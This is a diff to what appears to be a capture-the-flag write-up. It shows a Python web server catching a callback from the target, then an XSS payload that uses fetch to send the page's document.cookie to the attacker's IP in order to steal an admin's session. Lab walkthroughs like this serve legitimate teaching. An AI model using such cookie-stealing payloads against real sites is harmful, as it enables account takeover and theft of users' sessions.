@@ -106,3 +106,20 @@ Payload -> <img src="http://10.10.14.13/testing.png"></img>
 <br />
 
 ![6](../../../assets/images/Celestial/6.png)
+
+<br />
+
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.12 - - [30/Dec/2024 16:18:07] code 404, message File not found
+10.10.11.12 - - [30/Dec/2024 16:18:07] "GET /testing.png HTTP/1.1" 404 -
+
+<br />
+
+We have an XSS so to take advantage of it we built a payload with fetch to try to steal the cookies from some admin who is behind the web loading our malicious code and SURPRISE!:
+
+Payload -> <img src=x on error=fetch("http://10.10.14.13/"+document.cookie)></img>
+
+<br />
+
+
